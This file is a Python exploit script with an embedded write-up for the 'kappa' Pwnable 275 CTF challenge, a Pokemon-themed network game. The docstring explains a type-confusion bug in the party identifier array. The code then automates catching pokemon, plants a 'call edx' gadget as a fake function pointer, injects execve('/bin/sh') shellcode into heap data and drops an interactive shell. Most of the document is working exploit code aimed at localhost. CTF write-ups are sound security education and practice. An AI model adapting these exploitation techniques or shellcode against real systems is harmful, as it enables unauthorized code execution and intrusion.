#!/usr/bin/python

import struct
import socket
import telnetlib

""" 
	mike_pizza
	Gnu eDucks -- kappa - Pwnable 275
    NOTE: I began attempting this challenge after the competition was over. 
    So I cannot verify if my exploit would work on the target box. My guess is
    that it probably would given the memory permissions in place for other x86 
    32bit challenges. This exploit does depend on the heap being executable.

    The challenge was another text-based network service much like
    ezhp; however this one involved much more pop culture. Kappa presented
    a small game which took place in the world of Pokemon. We could do
    limited number of things, go into the wild in search of pokemon, heal our
    pokemon party, view our party, and change our pokemon's portraits.

    --[ Reverse Engineering the Vulnerability

    The application used a global array of pointers to represent the current 
    party members. These pointers were allocated whenever a pokemon was captured
    and pointed to a stream of bytes containing the pokemon's name, the pokemon's
    portrait, the pokemon's stat function pointer (more on this later!), the pokemon's
    health, the pokemon's attack power, and the name of the pokemon's attack.
    This was just a stream of data, not a struct. 

    [ name ] [ portrait] [ attack name ] [ health ] [ attack power ] [ stat function ptr ]

    Because this data was just a stream each pokemon needed to have its own function
    to find the stats within the data stream. Each one of these functions would know
    where the portrait, attack power, health, and attack name of the pokemon were inside
    the stream. When the command "Inspect your Pokemon" was entered, the program would
    march down the pokemon party array for each valid pokemon in this array the program
    would consult another global array, this other array had the identifiers of every
    party member by index. 

    For example:

    Pokemon Party:
    0 - ptr into heap to pokemon stream ----> [ "Bird Jesus" ] [ "  --- (portrait --- " ]
    1 - ptr into heap to pokemon stream ----> [ "Kakuna" ] [ ... ]

    Pokemon Identifiers:
    0 - 3 ; pigeot's identifier
    1 - 1 ; kakuna's identifier

    When print_stats function saw the first index of of the pokemon party array it would 
    then consult the pokemon identifier array's first index. Seeing that this value was
    one, it knew it was dealing with a Kakuna, so it knew to look 0x210 bytes into 
    kakuna's stream to find the stat function pointer. On the other hand when the program
    encountered the pokemon identifier of 3 for "Bird Jesus", it knew that it had to look
    some 0x500 bytes into the stream to find a "Bird Jesus" function pointer.
    
    This identifier was then used determine the location of the
    stat function pointer inside of a given pokemon data stream. So if we are able to some
    how disrupt the pokemon identifier array we can get the program to call a function
    pointer somewhere within memory we control (via the 'Change Pokemon artwork' option).

    Luckily, this disruption occurs when in the wild capturing pokemon. If we capture a 
    pokemon in the wild while our pokemon party is full the program will prompt us to switch
    out a pokemon, here the program forgets to update the pokemon id array. Now we capture
    four kakunas filling up our party (party size limit is five pokemon, I know this isn't
    canon), next we capture a charizard in the wild. We switch one of our kakuna's out for
    the charizard, but the program has forgotten to update the pokemon id array! Now when
    we invoke 'Inspect your Pokemon' the program will offset into charizard's data stream
    as if it were a kakuna, meaning that it will be looking for function pointer inside of
    charizards portrait! 

    --[ Exploitation

    To exploit the application we do what we discovered earlier, catch four kakuna's and
    then a charizard, switching out one of the kakuna's for the charizard. Now we update
    charizard's portrait, planting a malicious function pointer. Where to point this?
    My initial thoughts were to find a ROP gadget to pivot the stack onto our controlled
    part of the heap, but I had no luck finding any low hanging fruit. Its important to note
    that the only reason I am resorting to ROP is because I have no idea where my controlled
    buffer is when I take control of the program counter, ROP in this case is an attempt to
    defeat ASLR. I did find something else interesting, a "call edx" instruction. Looking
    at the state of the registers at function pointer call time I was able to determine that
    edx would always be pointing directly to the charizard pokemon data stream! This means we
    can use this gadget to jump into memory we control and execute shellcode! We make our
    function pointer point to the 'call edx' instruction. Now charizard's name will be 
    NOP sled tailed by a 'jmp $+2' instruction, allowing us to jump over the name field's
    null byte. Now the beginning of charizard's new portrait will be our shellcode, and
    a shell can be dropped!
    
"""

""" 
   	offsets:
	kakuna - 0x210 - function pointer
"""

# execve("/bin/sh") shellcode from Jean Pascal Pereira
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" +\
            "\x68\x68\x2f\x62\x69\x6e\x89" +\
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" +\
            "\xcd\x80\x31\xc0\x40\xcd\x80"

kakuna_funcptr = 0x210
charizard_size = 0x888

end_menu = "5. Change Pokemon artwork\n\n"
end_encounter = "3. Run\n"
catch_success = "Pokemon?\n"

def do_readuntil(s, patterns):
	returnstr = ""
	
	while True:
		byte = s.recv(1)	
		returnstr += byte
		for pattern in patterns:
			if (pattern in returnstr):
				return returnstr

def do_write(s, n):
	s.send(str(n) + "\n")
	f = s.makefile()
	f.flush()

def catch_four_kakunas(s):
	global end_menu
	global end_encounter
	global catch_success

	kakuna_count = 0

	while True:
		mesg = do_readuntil(s, [end_menu, end_encounter])
		if ("Kakuna" in mesg):
			n = do_write(s, 2)
			mesg = do_readuntil(s, [catch_success])
			do_write(s, kakuna_count)
			#print "[+] kakuna captured"
			kakuna_count += 1
			continue
		if (kakuna_count == 4):
			do_write(s, 1)
			return
		n = do_write(s, 1)

def catch_charizard(s):
	global end_menu
	global end_encounter
	global catch_success

	attacks = 0

	while True:	
		mesg = do_readuntil(s, [end_menu, end_encounter])
		if ("Charizard" in mesg):	
			# lower its health
			while attacks < 4:
				do_write(s, 1)
				mesg = do_readuntil(s, [end_encounter])
				attacks += 1
			do_write(s, 2)
			print "[+] charizard captured"
			mesg = do_readuntil(s, [catch_success])
			# we name charizard some shellcode
			do_write(s, ("\x90" * 11) + "\xeb\x02")
			do_readuntil(s, ["5. 3\n"])
			do_write(s, 5)
			return
		elif end_encounter in mesg:
			do_write(s, 3)
		else:	
			do_write(s, 1)

# change charizard's portrait
def write_chain(s):
	global kakuna_funcptr
	global charizard_size
	global shellcode

	print "[+] writing shellcode in charizard's portrait..."
	payload = shellcode
	payload += "A" * ((kakuna_funcptr - 15) - len(shellcode))

	do_readuntil(s, [end_menu])
	do_write(s, 5)
	do_readuntil(s, ["\x90\xeb\x02\n"])
	do_write(s, 5)

	# call edx
	chain = "\x84\x86\x04\x08"

	payload += chain	

	n = charizard_size - len(payload)
	payload += "mike_pizza" * charizard_size
	
	do_write(s, payload)
	

def main():
	global end_menu

	s = socket.create_connection(("localhost", 6969))

	print "[+] filling party with kakunas..."
	catch_four_kakunas(s)
	catch_charizard(s)
	write_chain(s)

	print "[+] calling shellcode..."	
	do_readuntil(s, [end_menu])
	do_write(s, 3)

	mesg = do_readuntil(s, ["Attack: Gust\n"])
	for i in range(0, 3):
		mesg = do_readuntil(s, ["Attack: Tackle\n"])

	print "[+] shell dropped"
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
	

main()
